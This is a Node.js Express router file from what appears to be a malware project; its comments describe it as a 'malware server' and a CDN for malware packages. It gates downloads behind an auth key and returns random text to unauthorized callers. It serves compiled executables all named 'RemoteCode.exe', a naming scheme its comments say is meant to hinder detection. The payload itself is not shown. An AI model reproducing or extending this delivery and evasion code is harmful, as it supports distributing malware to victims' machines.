const express = require('express');

const path = require("path");
const fs = require("fs");
const { execFileSync } = require("child_process");

const EXE_DATA = require("./exe_datas.js");
const Auth = require("./auth.js");
const { genAsciiStr } = require("./util.js");
const logging = require("./logging.js");

// Server IP we are hosting malware server on
const IP = "127.0.0.1:80";

// This router will handle the GET requests that ask to retrieve a specified malware.
// The routing is very simple here since GET requests simply act as a CDN for our malware packages
const getReqRouter = express.Router({
    mergeParams: true
});

// Create a middleware that checks for authentication. See auth.js for more info on how that's done
getReqRouter.get("*", (request, response, next) => {
    
    let authKey = Auth.getKeys.getWithHash(request.headers.authorization);
    
    if (authKey == null)
    {
        // If unauthorized, send a random 64 bit ASCII
        response.status(401);
        logging.log(`🔨 GET request denied for IP ${request.ip} due to invalid auth key '${request.headers.authorization}'.`)
        response.send(genAsciiStr(64));
    }
    else
    {
        next();
    }
});

// If default URL + authenticated, send appropriate EXE file
getReqRouter.get("/", (request, response, next) => {

    // We're going to compile all the C files with the same name to make it harder to detect what our malware does
    const exeName = "RemoteCode.exe";

    // We're using the JSON in EXE_DATA to prevent external machines from trying to run a file inclusion attack
    let reqEXEData = EXE_DATA[request.headers.exe];

    if (EXE_DATA[request.headers.exe])
    {
        // First, let's handle the paths. Here we store the path of the EXE file so we can reference it later. It should be in the same directory under $exeName
        var cDir = path.dirname(reqEXEData.cPath);          // 🤣 not to be confused with CDIR
        let exePath = path.resolve(cDir, `./${exeName}`);   // Absolute path for the EXE. This is what we're going to be using when returning the file
        
        // Check if our EXE file actually exists
        if (fs.existsSync(exePath))
        {
            logging.log(`EXE file ${reqEXEData.cPath} from ${request.ip} found!`);
        }
        else
        {
            logging.error(`🔨 Error in finding EXE file ${reqEXEData.cPath} from ${request.ip}`);
            response.status(500);
            next();
            return;
        }

        // Now that we know the EXE file exists, send the EXE file
        response.sendFile(exePath, (err) => {
            if (err)
            {
                logging.error(`🔨 Error in sending file ${exePath} to ${request.ip}: ${err}`);
                response.status(500);
                next();
                return;
            }
            else
            {
                logging.log(`🔨 EXE file ${exePath} sent to ${request.ip}.`);
            }
        });
    }
    else
    {
        logging.log(`🔨 GET request denied for IP ${request.ip} due to invalid EXE file '${request.headers.exe}'.`)
        response.status(401);
        next();
    }
});

module.exports = getReqRouter;